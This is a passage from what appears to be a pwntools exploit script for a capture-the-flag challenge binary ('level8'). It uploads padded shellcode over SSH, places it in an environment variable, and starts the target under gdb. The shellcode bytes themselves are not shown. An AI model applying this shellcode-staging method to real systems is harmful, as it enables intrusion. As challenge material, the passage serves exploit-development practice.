...
def conn():
    ...
    if args.LOCAL:
        ...
        if args.DEB:
            ...
            shell.upload_data(b"\xbb"*40 + shellcode_prev + b"\xff"*50 + shellcode + b"\xbb"*40, "shellcode_full")
            cmd = 'export SHELLCODE="$(cat ~/challenge/level8/shellcode_full)"'
            shell.process(['bash', '-c', cmd])
            # Start a process on the server
            r = gdb.debug(['/var/challenge/level8/8'], exe='/var/challenge/level8/8',
                                        ssh=shell,
                                        gdbscript='''
            break main
            continue
